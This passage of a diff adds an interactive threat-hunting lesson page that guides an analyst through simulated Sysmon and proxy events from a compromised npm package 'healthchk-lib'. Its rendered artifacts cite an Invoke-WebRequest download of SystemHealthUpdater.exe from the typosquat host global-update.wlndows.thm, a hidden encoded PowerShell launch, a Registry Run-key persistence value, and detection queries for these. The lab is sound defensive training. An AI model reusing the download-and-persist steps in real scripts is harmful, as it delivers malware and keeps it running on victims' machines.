+          summary: 'A per-user Run value was set to launch hidden PowerShell at logon.',
+          category: 'persistence',
+          raw: [
+            'UtcTime: 2025-06-21 10:58:27.520',
+            'EventCode: 13',
+            'EventRecordID: 43454',
+            'Computer: paw-tom',
+            'User: PAW-TOM\\itadmin-tom',
+            'EventType: SetValue',
+            'Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+            'TargetObject: HKU\\S-1-5-21-1530-8421-2601-1002\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Update Monitor',
+            'Details: ' + runValue
+          ].join('\n')
+        }
+      ];
+
+      var lessons = [
+        {
+          title: 'Frame the hypothesis',
+          meta: 'scope before search',
+          action: 'Show me the scope',
+          copy: 'Turn the case statement into a falsifiable question: did one third-party dependency lead to execution, delivery, and persistence on the authorized host?',
+          note: 'Do not widen the story to unrelated hosts just because their events look interesting. Scope is part of evidence quality.',
+          points: [
+            'Asset: paw-tom only.',
+            'User: PAW-TOM\\itadmin-tom.',
+            'Expected chain: package → execution → payload transfer → persistence.'
+          ],
+          mode: 'scope',
+          artifact: 'scope'
+        },
+        {
+          title: 'Time-box the host',
+          meta: 'reduce noise first',
+          action: 'Run the scoped search',
+          copy: 'Start with the known host and a tight window around the reported installation. This produces a small, chronological evidence set before you hunt for a specific answer.',
+          note: 'Sysmon stores UtcTime in UTC. Preserve the source timezone and normalize only when the case requires it.',
+          points: [
+            'Use exact dates: 21 June 2025, not 2026.',
+            'Sort oldest first to see cause before effect.',
+            'Keep raw precision even when the report uses second-level timestamps.'
+          ],
+          mode: 'scope',
+          artifact: 'timeline'
+        },
+        {
+          title: 'Rebuild process lineage',
+          meta: 'parent → child',
+          action: 'Trace Event ID 1',
+          copy: 'Process-creation events connect the npm lifecycle to Windows command execution. Follow ParentImage and Image instead of reading isolated command lines.',
+          note: 'The important lineage is node.exe → cmd.exe → powershell.exe. npm runs lifecycle scripts through cmd.exe on Windows.',
+          points: [
+            'EventCode 1 means Sysmon process creation.',
+            'EventRecordID 43451 identifies one record; it is not the Sysmon event type.',
+            'Parent and child context can turn a suspicious string into a coherent chain.'
+          ],
+          mode: 'lineage',
+          artifact: 'lineage'
+        },
+        {
+          title: 'Triage encoded PowerShell',
+          meta: 'recognize the shape',
+          action: 'Isolate the command',
+          copy: 'Hunt for the execution pattern first. The command combines a hidden window, no profile, an encoded argument, unusual length, and suspicious parentage.',
+          note: 'Base64 is encoding, not proof of malware. Here, the flag stack plus process lineage and later side effects make it high-signal.',
+          points: [
+            '-NoP suppresses the user profile.',
+            '-W Hidden suppresses the visible window.',
+            '-EncodedCommand expects a UTF-16LE Base64 string in Windows PowerShell.'
+          ],
+          mode: 'encoded',
+          artifact: 'flags'
+        },
+        {
+          title: 'Decode without executing',
+          meta: 'preserve verbatim text',
+          action: 'Decode UTF-16LE',
+          copy: 'Extract only the Base64 argument, decode it as UTF-16LE, and keep the result verbatim. Decoding is analysis; running the recovered text is not required.',
+          note: 'The first script creates a second encoded command for the Run key. Decode both layers so the stored behavior remains visible.',
+          points: [
+            'The outer script downloads the executable.',
+            'It encodes Start-Process \'$dest\' as a nested command.',
+            'It writes that nested command to a per-user Run value.'
+          ],
+          mode: 'encoded',
+          artifact: 'decode'
+        },
+        {
+          title: 'Correlate payload delivery',
+          meta: 'network + disk',
+          action: 'Join the delivery evidence',
+          copy: 'Treat the decoded script as a prediction, then confirm it in independent telemetry: a connection, an HTTP GET, and a file creation.',
+          note: 'The hostname is a typosquat: wlndows uses a lowercase L. Copy it exactly; visual normalization destroys the indicator.',
+          points: [
+            'T1105 covers the transfer into the environment.',
+            'The URL uses cleartext HTTP on port 80.',
+            'The supplied file event expands $env:APPDATA to an Administrator profile path.'
+          ],
+          mode: 'delivery',
+          artifact: 'delivery'
+        },
+        {
+          title: 'Prove user-logon persistence',
+          meta: 'script + registry',
+          action: 'Inspect the Run value',
+          copy: 'Correlate PowerShell script-block logging with the registry value-set event. One preserves the command syntax; the other proves the system modification.',
+          note: 'HKCU:\\ is PowerShell provider syntax. Sysmon may render the same hive as HKU\\<SID>. Preserve the exact representation from each source.',
+          points: [
+            'The Run value is Windows Update Monitor.',
+            'The value launches hidden PowerShell, not the executable directly.',
+            'A Run key survives reboot and executes when that user logs on.'
+          ],
+          mode: 'persistence',
+          artifact: 'persistence'
+        },
+        {
+          title: 'Write the three-stage chain',
+          meta: 'exact, scoped report',
+          action: 'Build the worked report',
+          copy: 'Convert the evidence into a concise reconstruction. Keep timestamps exact, use specific ATT&CK sub-techniques, and list literal artifacts rather than functional summaries.',
+          note: 'A strong report separates observation from inference and records inconsistencies instead of silently fixing them.',
+          points: [
+            'Stage 1: T1195.001, dependency compromise.',
+            'Stage 2: T1059.001 with supporting T1105.',
+            'Stage 3: T1547.001, per-user Run-key persistence.'
+          ],
+          mode: 'all',
+          artifact: 'report'
+        }
+      ];
+
+      var presets = {
+        scope: {
+          query: 'host=paw-tom earliest=2025-06-21T10:58:20 latest=2025-06-21T10:59:00 | sort +_time',
+          note: 'Scoped to paw-tom and the known forty-second window.',
+          filter: function () { return true; }
+        },
+        lineage: {
+          query: 'host=paw-tom EventCode=1 | table _time ParentImage Image CommandLine | sort +_time',
+          note: 'Process creation only: read ParentImage → Image from oldest to newest.',
+          filter: function (event) { return event.code === '1'; }
+        },
+        encoded: {
+          query: 'host=paw-tom EventCode=1 Image="*powershell.exe" CommandLine="*-EncodedCommand*"',
+          note: 'One process event contains the encoded-command pattern and its exact parent.',
+          filter: function (event) { return event.category === 'encoded'; }
+        },
+        delivery: {
+          query: 'host=paw-tom (EventCode=3 OR EventCode=11 OR source="proxy:http") | sort +_time',
+          note: 'Independent network and file evidence confirms what the decoded script predicted.',
+          filter: function (event) { return event.category === 'delivery'; }
+        },
+        persistence: {
+          query: 'host=paw-tom (EventCode=4104 OR EventCode=13) "CurrentVersion\\\\Run"',
+          note: 'Script text plus registry telemetry establishes the persistence action.',
+          filter: function (event) { return event.category === 'persistence'; }
+        },
+        all: {
+          query: 'host=paw-tom | sort +_time',
+          note: 'All case events restored and sorted oldest first.',
+          filter: function () { return true; }
+        }
+      };
+
+      var currentLesson = 0;
+      var currentEvents = events.slice();
+      var selectedEventId = null;
+      var visited = new Set([0]);
+      var evidence = [];
+      var artifactMode = null;
+
+      var lessonList = document.getElementById('lesson-list');
+      var eventBody = document.getElementById('event-body');
+      var rawEvent = document.getElementById('raw-event');
+      var artifactContent = document.getElementById('artifact-content');
+      var searchInput = document.getElementById('search-input');
+      var queryNote = document.getElementById('query-note');
+
+      function escapeHtml(value) {
+        return String(value)
+          .replace(/&/g, '&amp;')
+          .replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;')
+          .replace(/"/g, '&quot;')
+          .replace(/'/g, '&#039;');
+      }
+
+      function renderLessons() {
+        lessonList.innerHTML = lessons.map(function (lesson, index) {
+          var current = index === currentLesson;
+          var classes = 'lesson-button' + (visited.has(index) ? ' visited' : '');
+          return '<button type="button" class="' + classes + '" data-lesson="' + index + '"' +
+            (current ? ' aria-current="step"' : '') + '>' +
+            '<span class="lesson-number">' + (index + 1) + '</span>' +
+            '<span><span class="lesson-title">' + escapeHtml(lesson.title) + '</span>' +
+            '<span class="lesson-meta">' + escapeHtml(lesson.meta) + '</span></span></button>';
+        }).join('');
+        document.getElementById('lesson-progress').textContent = visited.size + ' / ' + lessons.length;
+        document.getElementById('progress-fill').style.width = ((visited.size / lessons.length) * 100) + '%';
+      }
+
+      function renderCoach() {
+        var lesson = lessons[currentLesson];
+        document.getElementById('coach-step').textContent = 'Lesson ' + (currentLesson + 1) + ' of ' + lessons.length;
+        document.getElementById('coach-title').textContent = lesson.title;
+        document.getElementById('coach-copy').textContent = lesson.copy;
+        document.getElementById('teaching-note').textContent = lesson.note;
+        document.getElementById('lesson-points').innerHTML = lesson.points.map(function (point) {
+          return '<li>' + escapeHtml(point) + '</li>';
+        }).join('');
+        document.getElementById('guide-action').textContent = lesson.action;
+        document.getElementById('next-lesson').textContent = currentLesson === lessons.length - 1 ? 'Return to lesson 1' : 'Next lesson';
+      }
+
+      function renderEvents() {
+        document.getElementById('result-count').textContent = currentEvents.length + (currentEvents.length === 1 ? ' event' : ' events');
+        if (!currentEvents.length) {
+          eventBody.innerHTML = '<tr><td colspan="6">No simulated events match. Try a preset or a broader literal term.</td></tr>';
+          return;
+        }
+        eventBody.innerHTML = currentEvents.map(function (event) {
+          var selected = event.id === selectedEventId ? ' class="selected"' : '';
+          return '<tr data-event-id="' + event.id + '"' + selected + ' tabindex="0">' +
+            '<td class="time-cell">' + escapeHtml(event.time.slice(11)) + '</td>' +
+            '<td>' + escapeHtml(event.source) + '</td>' +
+            '<td><span class="event-pill">' + escapeHtml(event.code) + '</span></td>' +
+            '<td class="process-cell"><strong>' + escapeHtml(event.process) + '</strong><span>' + escapeHtml(event.id) + '</span></td>' +
+            '<td>' + escapeHtml(event.parent) + '</td>' +
+            '<td class="summary-cell">' + escapeHtml(event.summary) + '</td>' +
+            '</tr>';
+        }).join('');
+      }
+
+      function selectEvent(id) {
+        var event = events.find(function (candidate) { return candidate.id === id; });
+        if (!event) return;
+        selectedEventId = id;
+        rawEvent.textContent = event.raw;
+        document.getElementById('raw-title').textContent = 'Raw event · ' + event.id;
+        if (!evidence.some(function (item) { return item.id === event.id; })) {
+          evidence.push({ id: event.id, label: event.code + ' · ' + event.process });
+        }
+        renderEvidence();
+        renderEvents();
+      }
+
+      function renderEvidence() {
+        var list = document.getElementById('evidence-list');
+        if (!evidence.length) {
+          list.innerHTML = '<span class="evidence-chip">No event selected yet</span>';
+          return;
+        }
+        list.innerHTML = evidence.map(function (item) {
+          return '<span class="evidence-chip" title="' + escapeHtml(item.id) + '">' + escapeHtml(item.label) + '</span>';
+        }).join('');
+      }
+
+      function runPreset(name) {
+        var preset = presets[name] || presets.all;
+        searchInput.value = preset.query;
+        currentEvents = events.filter(preset.filter);
+        selectedEventId = null;
+        rawEvent.textContent = 'Select a result to inspect the exact raw event.';
+        document.getElementById('raw-title').textContent = 'Raw event · select a row';
+        queryNote.textContent = preset.note;
+        renderEvents();
+        if (currentEvents.length === 1) selectEvent(currentEvents[0].id);
+      }
+
+      function runLiteralSearch(query) {
+        var normalized = query.trim().toLowerCase();
+        if (!normalized) {
+          runPreset('all');
+          return;
+        }
+        var matchingPreset = Object.keys(presets).find(function (name) {
+          return presets[name].query.toLowerCase() === normalized;
+        });
+        if (matchingPreset) {
+          runPreset(matchingPreset);
+          return;
+        }
+        if (normalized.indexOf('encodedcommand') >= 0) {
+          runPreset('encoded');
+          return;
+        }
+        if (normalized.indexOf('eventcode=1') >= 0) {
+          runPreset('lineage');
+          return;
+        }
+        if (normalized.indexOf('eventcode=13') >= 0 || normalized.indexOf('eventcode=4104') >= 0 || normalized.indexOf('currentversion') >= 0) {
+          runPreset('persistence');
+          return;
+        }
+        if (normalized.indexOf('eventcode=3') >= 0 || normalized.indexOf('eventcode=11') >= 0 || normalized.indexOf('proxy:http') >= 0) {
+          runPreset('delivery');
+          return;
+        }
+        var terms = normalized.split(/\s+/).filter(function (term) {
+          return term && term.indexOf('host=') !== 0 && term.indexOf('earliest=') !== 0 && term.indexOf('latest=') !== 0 && term !== '|';
+        });
+        currentEvents = events.filter(function (event) {
+          var haystack = (event.time + ' ' + event.source + ' ' + event.code + ' ' + event.process + ' ' + event.parent + ' ' + event.summary + ' ' + event.raw).toLowerCase();
+          return terms.every(function (term) {
+            var clean = term.replace(/^["'(]+|[")',]+$/g, '').replace(/\*/g, '');
+            return !clean || haystack.indexOf(clean) >= 0;
+          });
+        });
+        selectedEventId = null;
+        rawEvent.textContent = 'Select a result to inspect the exact raw event.';
+        queryNote.textContent = 'Literal training search applied across every simulated event field.';
+        renderEvents();
+      }
+
+      function renderScope() {
+        artifactContent.innerHTML =
+          '<ul class="artifact-list">' +
+          '<li class="artifact-item"><strong>Question:</strong> Did <code>healthchk-lib@1.0.1</code> lead to execution, delivery, and persistence?</li>' +
+          '<li class="artifact-item"><strong>Include:</strong> <code>paw-tom</code> · <code>PAW-TOM\\itadmin-tom</code> · 21 Jun 2025 10:58:20–10:59:00</li>' +
+          '<li class="artifact-item"><strong>Exclude:</strong> unrelated assets and activity outside the hypothesis.</li>' +
+          '</ul>';
+      }
+
+      function renderTimeline() {
+        artifactContent.innerHTML =
+          '<ul class="artifact-list">' +
+          '<li class="artifact-item"><code>10:58:24.000</code> dependency lifecycle begins</li>' +
+          '<li class="artifact-item"><code>10:58:27.000</code> encoded PowerShell process starts</li>' +
+          '<li class="artifact-item"><code>10:58:27.114–.391</code> network transfer and file creation</li>' +
+          '<li class="artifact-item"><code>10:58:27.410–.520</code> Run-key command and value set</li>' +
+          '</ul>';
+      }
+
+      function renderLineage() {
+        artifactContent.innerHTML =
+          '<ul class="artifact-list">' +
+          '<li class="artifact-item"><code>node.exe</code><br><span>npm install + dependency lifecycle</span></li>' +
+          '<li class="artifact-item">↓ parent-child relationship</li>' +
+          '<li class="artifact-item"><code>cmd.exe</code><br><span>Windows lifecycle command shell</span></li>' +
+          '<li class="artifact-item">↓ parent-child relationship</li>' +
+          '<li class="artifact-item"><code>powershell.exe</code><br><span>postinstall script, then encoded execution</span></li>' +
+          '</ul>';
+      }
+
+      function renderFlags() {
+        artifactContent.innerHTML =
+          '<ul class="flag-list">' +
+          '<li class="flag-item"><code>-NoP</code> NoProfile: do not load the user profile.</li>' +
+          '<li class="flag-item"><code>-W Hidden</code> WindowStyle Hidden: suppress the visible console.</li>' +
+          '<li class="flag-item"><code>-EncodedCommand</code> Decode the following Base64 as UTF-16LE.</li>' +
+          '<li class="flag-item"><code>' + outerBase64.length + ' chars</code> Unusually long argument; useful triage signal, not a verdict.</li>' +
+          '<li class="flag-item"><code>cmd.exe → powershell.exe</code> Parent context strengthens the signal.</li>' +
+          '</ul>';
+      }
+
+      function renderDecode(tab) {
+        var decoded = fromUtf16leBase64(outerBase64);
+        var innerDecoded = fromUtf16leBase64(innerBase64);
+        var showInner = tab === 'inner';
+        artifactContent.innerHTML =
+          '<div class="decode-tabs">' +
+          '<button class="decode-tab ' + (!showInner ? 'active' : '') + '" type="button" data-decode-tab="outer">Outer script</button>' +
+          '<button class="decode-tab ' + (showInner ? 'active' : '') + '" type="button" data-decode-tab="inner">Nested command</button>' +
+          '</div>' +
+          '<pre class="code-block" id="decoded-output">' + escapeHtml(showInner ? innerDecoded : decoded) + '</pre>' +
+          '<p class="query-note">' + (showInner ? 'The Run value decodes to the exact launch instruction.' : 'Verbatim UTF-16LE decode. Analyze as text; do not execute it.') + '</p>';
+      }
+
+      function renderDelivery() {
+        artifactContent.innerHTML =
+          '<ul class="artifact-list">' +
+          '<li class="artifact-item"><strong>Predicted by script</strong><br><code>Invoke-WebRequest -Uri $url -OutFile $dest</code></li>' +
+          '<li class="artifact-item"><strong>Network confirmation</strong><br><code>GET http://global-update.wlndows.thm/SystemHealthUpdater.exe</code></li>' +
+          '<li class="artifact-item"><strong>Disk confirmation</strong><br><code>C:\\Users\\Administrator\\AppData\\Roaming\\SystemHealthUpdater.exe</code></li>' +
+          '<li class="artifact-item correction"><strong>Evidence-quality note:</strong> the supplied path says Administrator while the event user says itadmin-tom. Preserve both and verify the mismatch; do not silently rewrite the source.</li>' +
+          '</ul>';
+      }
+
+      function renderPersistence() {
+        artifactContent.innerHTML =
+          '<ul class="artifact-list">' +
+          '<li class="artifact-item"><strong>PowerShell source path</strong><br><code>HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code></li>' +
+          '<li class="artifact-item"><strong>Sysmon target</strong><br><code>HKU\\S-1-5-21-…\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Update Monitor</code></li>' +
+          '<li class="artifact-item"><strong>Value name</strong><br><code>Windows Update Monitor</code></li>' +
+          '<li class="artifact-item"><strong>Stored behavior</strong><br><code>' + escapeHtml(runValue) + '</code></li>' +
+          '</ul>';
+      }
+
+      function renderReport() {
+        artifactContent.innerHTML =
+          '<div class="report">' +
+          '<article class="report-stage"><header><strong>Stage 1 · NPM Supply Chain Compromise</strong><time>Jun 21, 2025 10:58:24 AM</time></header>' +
+          '<p>Installation of <code>healthchk-lib@1.0.1</code> invoked its malicious npm <code>postinstall</code> lifecycle script at <code>C:\\Development\\node_modules\\healthchk-lib\\scripts\\postinstall.ps1</code>.</p>' +
+          '<span class="attack-tag">Initial Access</span><span class="attack-tag">T1195.001</span></article>' +
+          '<article class="report-stage"><header><strong>Stage 2 · PowerShell Payload Delivery</strong><time>Jun 21, 2025 10:58:27 AM</time></header>' +
+          '<p><code>node.exe → cmd.exe → powershell.exe</code> led to the exact encoded command. Its decoded <code>Invoke-WebRequest</code> downloaded <code>SystemHealthUpdater.exe</code> over HTTP from <code>global-update.wlndows.thm</code>.</p>' +
+          '<span class="attack-tag">Execution</span><span class="attack-tag">T1059.001</span><span class="attack-tag">T1105 supporting</span></article>' +
+          '<article class="report-stage"><header><strong>Stage 3 · Registry Run Key Modification</strong><time>Jun 21, 2025 10:58:27 AM</time></header>' +
+          '<p><code>Set-ItemProperty</code> created <code>Windows Update Monitor</code> under <code>HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>. The nested command starts the payload when that user logs on.</p>' +
+          '<span class="attack-tag">Persistence</span><span class="attack-tag">T1547.001</span></article>' +
+          '</div>';
+      }
+
+      function renderArtifact(mode) {
+        artifactMode = mode;
+        if (mode === 'scope') renderScope();
+        else if (mode === 'timeline') renderTimeline();
+        else if (mode === 'lineage') renderLineage();
+        else if (mode === 'flags') renderFlags();
+        else if (mode === 'decode') renderDecode('outer');
+        else if (mode === 'delivery') renderDelivery();
+        else if (mode === 'persistence') renderPersistence();
+        else if (mode === 'report') renderReport();
+      }
+
+      function takeGuidedAction() {
+        var lesson = lessons[currentLesson];
+        runPreset(lesson.mode);
+        renderArtifact(lesson.artifact);
+        if (lesson.mode === 'lineage') {
+          ['sysmon-43449', 'sysmon-43450', 'sysmon-43451'].forEach(function (id) {
+            var event = events.find(function (candidate) { return candidate.id === id; });
+            if (event && !evidence.some(function (item) { return item.id === id; })) {
+              evidence.push({ id: id, label: event.code + ' · ' + event.process });
+            }
+          });
+          renderEvidence();
+        } else if (lesson.mode === 'delivery' || lesson.mode === 'persistence') {
+          currentEvents.forEach(function (event) {
+            if (!evidence.some(function (item) { return item.id === event.id; })) {
+              evidence.push({ id: event.id, label: event.code + ' · ' + event.process });
+            }
+          });
+          renderEvidence();
+        }
+      }
+
+      function goToLesson(index) {
+        currentLesson = (index + lessons.length) % lessons.length;
+        visited.add(currentLesson);
+        renderLessons();
+        renderCoach();
+      }
+
+      lessonList.addEventListener('click', function (event) {
+        var button = event.target.closest('[data-lesson]');
+        if (button) goToLesson(Number(button.dataset.lesson));
+      });
+
+      document.getElementById('guide-action').addEventListener('click', takeGuidedAction);
+      document.getElementById('next-lesson').addEventListener('click', function () {
+        goToLesson(currentLesson + 1);
+      });
+      document.getElementById('search-form').addEventListener('submit', function (event) {
+        event.preventDefault();
+        runLiteralSearch(searchInput.value);
+      });
+      document.querySelector('.preset-row').addEventListener('click', function (event) {
+        var button = event.target.closest('[data-preset]');
+        if (button) runPreset(button.dataset.preset);
+      });
+      eventBody.addEventListener('click', function (event) {
+        var row = event.target.closest('[data-event-id]');
+        if (row) selectEvent(row.dataset.eventId);
+      });
+      eventBody.addEventListener('keydown', function (event) {
+        var row = event.target.closest('[data-event-id]');
+        if (row && (event.key === 'Enter' || event.key === ' ')) {
+          event.preventDefault();
+          selectEvent(row.dataset.eventId);
+        }
+      });
+      artifactContent.addEventListener('click', function (event) {
+        var tab = event.target.closest('[data-decode-tab]');
+        if (tab && artifactMode === 'decode') renderDecode(tab.dataset.decodeTab);
+      });
+
+      renderLessons();
+      renderCoach();
+      renderEvidence();
+      runPreset('scope');
+
+      window.healthHazardLab = {
+        events: events,
+        decodedScript: decodedScript,
+        outerBase64: outerBase64,
+        innerBase64: innerBase64,
+        fullCommandLine: fullCommandLine,
+        runValue: runValue,
+        lessons: lessons
+      };
+    }());
+  </script>
+</body>
+</html>
